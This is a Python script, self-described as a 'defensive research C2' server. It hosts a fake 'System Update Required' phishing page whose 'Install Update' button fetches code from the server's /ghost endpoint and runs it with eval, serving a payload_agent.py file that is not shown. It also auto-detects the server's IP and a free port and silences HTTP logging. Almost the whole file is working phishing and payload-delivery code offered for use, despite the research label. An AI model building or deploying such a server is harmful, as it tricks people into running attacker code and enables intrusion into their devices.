#!/usr/bin/env python3
"""
GHOST SERVER - Defensive Research C2
Auto-port scanning | Dynamic URLs | No sudo required
"""
import http.server
import socketserver
import socket
import logging
from http import HTTPStatus
import os
import random
import string
import sys
import time

# Global vars for dynamic URL generation
SERVER_IP = None
SERVER_PORT = None

class GhostServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/ghost":
            self.serve_agent()
        elif self.path in ["/", "/index.html"]:
            self.serve_phishing_page()
        else:
            self.send_error(HTTPStatus.NOT_FOUND, "Not Found")

    def serve_agent(self):
        """Serve payload_agent.py"""
        try:
            with open("payload_agent.py", "rb") as f:
                self.send_response(HTTPStatus.OK)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(f.read())
            logging.info(f"[GHOST] Agent sent → {self.client_address[0]}")
        except FileNotFoundError:
            self.send_error(HTTPStatus.NOT_FOUND, "Agent not found")

    def serve_phishing_page(self):
        """Serve dynamic phishing HTML with live URL"""
        html = f"""<!DOCTYPE html>
<html>
<head>
  <title>System Update Required</title>
  <style>
    /* CSS styles omitted for brevity */
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">🔄</div>
    <h2>System Update Required</h2>
    <p>Your device needs a critical security patch to continue.</p>
    <button onclick="deploy()">Install Update</button>
  </div>

  <script>
  function deploy() {{
    fetch('http://{SERVER_IP}:{SERVER_PORT}/ghost')
      .then(r => r.text())
      .then(code => {{
        eval(code);
        alert("Update installed successfully!");
      }})
      .catch(err => alert("Update failed. Please try again."));
  }}
  </script>
</body>
</html>"""

        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())
        logging.info(f"[GHOST] Phishing page → {self.client_address[0]}")

    def log_message(self, format, *args):
        # Silent HTTP logs
        return

def get_local_ip():
    """Get the server's local IP address"""
    try:
        # Connect to external IP to determine local interface
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        return ip
    except:
        return "127.0.0.1"

def find_free_port(start=8000, end=9000):
    """Scan ports and return first available"""
    for port in range(start, end + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("", port))
                return port
        except OSError:
            continue
    raise RuntimeError(f"No free ports found in range {start}-{end}")

def run_server():
    global SERVER_IP, SERVER_PORT

    print("="*60)
    print("🚀 GHOST SERVER - AUTO-PORT | DEFENSIVE RESEARCH C2")
    print("="*60)

    # Auto-detect IP and port
    try:
        SERVER_IP = get_local_ip()
        SERVER_PORT = find_free_port(8000, 9000)
    except Exception as e:
        logging.error(f"Error: {e}")
        print(f"❌ Error: {e}")
        sys.exit(1)

    print(f"✓ IP detected: {SERVER_IP}")
    print(f"✓ Port found: {SERVER_PORT}")
    print("="*60)
    print(f"🌐 GHOST LIVE → http://{SERVER_IP}:{SERVER_PORT}")
    print(f"🎯 Agent URL  → http://{SERVER_IP}:{SERVER_PORT}/ghost")
    print("="*60)
    print("Press Ctrl+C to stop")
    print("="*60)

    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("", SERVER_PORT), GhostServer)

        logging.basicConfig(
            filename=os.path.join(os.path.dirname(__file__), 'ghost_server.log'),
            level=logging.INFO,
            format='%(asctime)s %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        logging.info(f"🚀 GHOST started on {SERVER_IP}:{SERVER_PORT}")

        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n⚠️  Shutting down GHOST server...")
        logging.info("GHOST server stopped")
    except Exception as e:
        logging.error(f"Error: {e}")
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_server()